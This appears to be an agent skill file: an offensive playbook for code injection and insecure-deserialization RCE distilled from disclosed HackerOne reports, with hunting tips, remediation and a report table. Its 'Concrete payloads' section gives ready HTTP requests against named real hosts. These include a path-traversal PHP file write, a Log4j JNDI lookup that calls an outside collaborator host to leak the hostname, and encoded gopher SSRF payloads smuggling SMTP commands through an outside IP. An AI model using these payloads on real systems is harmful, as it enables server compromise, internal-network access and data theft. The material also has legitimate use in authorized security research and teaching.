---
name: code-injection-rce
description: "Code Injection & Insecure Deserialization (RCE) offensive playbook from 169 disclosed HackerOne reports (52 critical, 55 high, 35 medium, 27 low). Use when hunting or reviewing code injection & insecure deserialization (rce). Triggers: code, execution, remote, arbitrary, injection."
license: "For authorized security testing and education only."
---

# Code Injection & Insecure Deserialization (RCE)

> Distilled from **169** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Attacker input is evaluated as code or unsafely deserialized, yielding remote code execution  -  `eval`/`new Function`, template injection (SSTI), insecure deserialization, unsafe dynamic includes.

## Where to hunt

- Look for `eval`, `Function`, template engines with user input, `pickle`/`unserialize`/Java/.NET deserialization, YAML/`load`, and dynamic `require`/`include`.
- Fingerprint template engines with `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` style probes.

## Exploitation playbook

- SSTI → sandbox escape to OS command execution.
- Deserialization → craft a gadget chain (ysoserial and friends) to execute code on load.
- Filter/`$where`/sift-style JS eval sinks in query languages.

## Bypass techniques

- Sandbox escapes, gadget-chain construction, encoding to slip past naive filters.

## Impact & escalation

- Unauthenticated RCE → full server compromise, secrets/DB-credential theft, supply-chain pivot.

## Remediation

- Never eval untrusted input, use safe (data-only) deserializers with type allowlists, sandbox/allowlist template variables, patch vulnerable parsers.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#1356845](https://hackerone.com/reports/1356845)  -  CVE-2021-40870 on [52.204.160.31]
*critical*

```http
POST /v1/backend1 HTTP/1.1
Host: 52.204.160.31
Content-Length: 136
Content-Type: application/x-www-form-urlencoded

CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE<?php phpinfo()?>
```

### 2. [#1442644](https://hackerone.com/reports/1442644)  -  Log4j Java RCE in [beta.dev.adobeconnect.com]
*critical*

```http
GET /?x=${jndi:ldap://${hostName}.dq7iqbvjiufrlpt5mri9dvpb42atyi.burpcollaborator.net/a} HTTP/1.1
Host: beta.dev.adobeconnect.com
Cookie: BREEZESESSION=breezdiekv3smcc2xdw3u; BreezeCCookie=conn-BZTI-9BM9-2M7O-HWCG-XCF2-KDFT-KN7O-Y78S
```

### 3. [#895696](https://hackerone.com/reports/895696)  -  Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/…
*medium, $300*

```http
GET /dashboard/Campaign/json_status/%68%74%74%70%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%2f%6f%2e%70%68%70%3f%73%3d%67%6f%70%68%65%72%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%3a%32%35%2f%5f%48%45%4c%4f%25%32%30%74%65%73%74%2e%6f%72%67%25%32%35%30%64%25%32%35%30%61%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%25%32%30%25%32%35%30%64%25%32%35%30%61%52%43%50%54%25%32%30%54%4f%3a%6b%6f%6e%74%61%6b%74%40%64%65%65%70%73%65%63%2e%70%6c%25%32%35%30%64%25%32%35%30%61%44%41%54%41%25%32%35%30%64%25%32%35%30%61%54%65%73%74%25%32%35%30%64%25%32%35%30%61%2e HTTP/1.1
Host: labs.data.gov
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9…
```

### 4. [#895696](https://hackerone.com/reports/895696)  -  Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/…
*medium, $300*

```http
GET /dashboard/Campaign/json_status/http%3A%2F%2F51.178.47.176%2Fo.php%3Fs%3Dhttp%3A%2F%2F51.178.47.176%2Ftest HTTP/1.1
Host: labs.data.gov
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9…
```

### 5. [#895696](https://hackerone.com/reports/895696)  -  Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/…
*medium, $300*

```http
GET /dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A4445 HTTP/1.1
Host: labs.data.gov
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9…
```

### 6. [#895696](https://hackerone.com/reports/895696)  -  Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/…
*medium, $300*

```http
GET /dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A443 HTTP/1.1
Host: labs.data.gov
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9…
```

More payloads: see [payloads.md](payloads.md) (142 curated).

## Recurring patterns in this dataset

Most frequent terms across the 169 reports (term (count)): `code` (122), `execution` (83), `remote` (64), `arbitrary` (59), `injection` (52), `rce` (50), `attacker` (42), `allowed` (39), `file` (38), `deserialization` (33), `malicious` (32), `command` (27), `discovered` (26), `insecure` (24), `execute` (20), `server` (19), `through` (18), `apache` (16)

## Worked example  -  [report #925585](https://hackerone.com/reports/925585)

*RCE via npm misconfig -- installing internal libraries from the public registry* (critical, $30,000)

> A vulnerability was identified where certain development projects defaulted to the public NPM registry, instead of using the intended internal packages. This allowed for the creation of packages on the public registry that could have been registered with malicious intent and included in internal development. The issue was mitigated by PayPal with no evidence of prior malicious activity.…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#925585](https://hackerone.com/reports/925585) | critical | $30,000 | paypal | RCE via npm misconfig -- installing internal libraries from the public registry |
| [#1154542](https://hackerone.com/reports/1154542) | critical | $20,000 | gitlab | RCE when removing metadata with ExifTool |
| [#1125425](https://hackerone.com/reports/1125425) | critical | $20,000 | gitlab | RCE via unsafe inline Kramdown options when rendering certain Wiki pages |
| [#873614](https://hackerone.com/reports/873614) | critical | $15,000 | playstation | Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application |
| [#3782701](https://hackerone.com/reports/3782701) | critical | $12,000 | mozilla | Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where) |
| [#2255750](https://hackerone.com/reports/2255750) | critical | $8,000 | mozilla | Remote code execution and exfiltration of secret tokens by poisoning the mozilla/fxa CI… |
| [#1529790](https://hackerone.com/reports/1529790) | critical | $5,000 | aiven_ltd | Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration |
| [#1044716](https://hackerone.com/reports/1044716) | critical | $2,000 | eternal | SQL Injection in www.hyperpure.com |

*See [reference.md](reference.md) for all 169 reports in this class.*
